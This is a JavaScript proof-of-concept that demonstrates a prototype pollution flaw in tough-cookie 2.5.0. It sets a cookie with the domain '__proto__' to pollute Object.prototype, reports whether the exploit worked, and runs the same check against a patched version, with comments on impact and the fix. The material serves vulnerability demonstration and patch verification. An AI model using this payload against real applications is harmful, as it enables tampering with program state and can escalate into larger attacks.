/**
 * This script demonstrates the prototype pollution vulnerability present
 * in version 2.5.0 of the tough-cookie library. Prototype pollution occurs
 * when untrusted data is allowed to manipulate the prototype of JavaScript
 * objects, potentially leading to severe security issues.
 */

const tough = require("tough-cookie");

/**
 * Demonstrates the exploitation of the prototype pollution vulnerability
 * in version 2.5.0.
 */
function testPrototypePollution() {
  console.log("Testing prototype pollution...");

  // Initialize a new CookieJar
  const jar = new tough.CookieJar(undefined, {
    rejectPublicSuffixes: false, // Disables domain suffix validation
  });

  try {
    // Attempt to set a malicious cookie with the domain "__proto__"
    // This targets the Object prototype chain to introduce a polluted property
    jar.setCookieSync(
      "Slonser=polluted; Domain=__proto__; Path=/notauth",
      "https://__proto__/admin"
    );

    // Add a normal cookie for comparison
    jar.setCookieSync(
      "Auth=Lol; Domain=google.com; Path=/notauth",
      "https://google.com/"
    );

    // Check if prototype pollution occurred
    const obj = {};
    if (obj["/notauth"]) {
      console.log("EXPLOITED SUCCESSFULLY");
    } else {
      console.log("EXPLOIT FAILED");
    }
  } catch (err) {
    console.error("Error during exploit:", err.message);
  }
}

/**
 * Demonstrates the behavior of the patched version to prevent prototype pollution.
 */
function testPatchedVersion() {
  console.log("\nTesting patched version...");

  // Initialize a new CookieJar
  const jar = new tough.CookieJar(undefined, {
    rejectPublicSuffixes: false, // Disables domain suffix validation
  });

  try {
    // Attempt to set a malicious cookie with the domain "__proto__"
    jar.setCookieSync(
      "Slonser=polluted; Domain=__proto__; Path=/notauth",
      "https://__proto__/admin"
    );

    // Check if prototype pollution occurred
    const obj = {};
    if (obj["/notauth"]) {
      console.log("EXPLOITED SUCCESSFULLY");
    } else {
      console.log("EXPLOIT FAILED");
    }
  } catch (err) {
    console.error("Error during exploit on patched version:", err.message);
  }
}

/**
 * Potential Damage of Prototype Pollution:
 * - An attacker can modify built-in JavaScript object behaviors, leading to application crashes.
 * - Sensitive data exposure by manipulating application logic or object prototypes.
 * - In severe cases, Remote Code Execution (RCE) by injecting malicious code through prototype pollution.
 *
 * Resolution in the Patched Version:
 * - The library now initializes key storage (like `idx`) with `Object.create(null)` to avoid inheriting
 *   prototype methods and properties.
 * - Additional domain and path validations have been implemented to block malicious inputs.
 */

// Run the tests
testPrototypePollution();
testPatchedVersion();
